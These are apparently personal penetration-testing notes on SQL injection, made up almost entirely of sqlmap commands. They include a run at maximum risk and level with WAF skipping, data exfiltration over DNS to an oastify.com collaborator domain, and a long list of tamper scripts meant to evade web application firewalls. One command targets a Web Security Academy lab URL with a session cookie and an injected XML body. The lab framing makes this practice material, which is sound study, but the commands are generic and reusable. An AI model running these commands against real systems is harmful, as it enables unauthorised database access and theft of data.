# SQLI

Make sure SQLMAP DNS Collaborator extension is still installed (testing)

* Cryptocat recommends to avoid using `-r`option and to just use CLI

```bash
sudo sqlmap --skip-waf --risk 3 --level 3 -r request.item -o --batch --dns-domain=laz3k1ymu2kc0idl9tumx345nwtnhf54.oastify.com
```

Tamper scripts general (Jhaddix)

```
tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

```
sqlmap --list-tampers 
```

```bash
# Hex Entity encoded XML Post for lab
sudo sqlmap --skip-waf --dns-domain=izlubtqohy2z2888mo48gfhcv31upkd9.oastify.com  --level 5 --risk 3 -o -u https://0acf0086046a3c558189d41400ba001d.web-security-academy.net/product/stock --cookie "session=Q3sPhj537HOewWIqNvbF7uz9B8VMoaYI" --data '<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1*</storeId></stockCheck>' --tamper=hexentities --batch

```
